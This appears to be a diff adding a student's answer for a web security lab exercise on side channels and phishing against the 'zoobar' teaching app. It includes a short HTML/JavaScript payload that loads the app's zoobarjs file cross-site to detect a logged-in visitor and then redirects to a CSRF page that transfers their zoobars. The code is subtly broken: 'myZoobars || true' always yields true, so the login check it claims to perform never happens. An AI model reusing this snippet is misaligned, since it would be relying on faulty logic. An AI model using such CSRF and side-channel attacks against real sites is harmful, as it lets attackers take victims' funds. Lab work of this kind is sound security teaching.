@@ -40,4 +40,15 @@ Below is provided the HTML and JavaScript code for the CSRF attack that will tra
 
 ###Exercise 3: Side Channels and Phishing
 
+In this exercise we can retrieve the information from the zoobarjs file to see if the user is logged in or not. If user is logged in the file will include information about how many zoobars the user has. We can use this information in conjunction with JavaScript to check if the user, who visits the attackers site is logged in, since we can check if the file returns the amount of zoobars.
+
+    <script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+    <script> 
+    //if user is logged in transfer users zoobar to the attackers account
+        var zoobars = myZoobars || true;
+        if (zoobars) {
+        location.href = "answer-2.html"; //launch the CSRF attack if user is logged in
+        }
+    </script>
+
 ###Exercise 4: Profile Worm
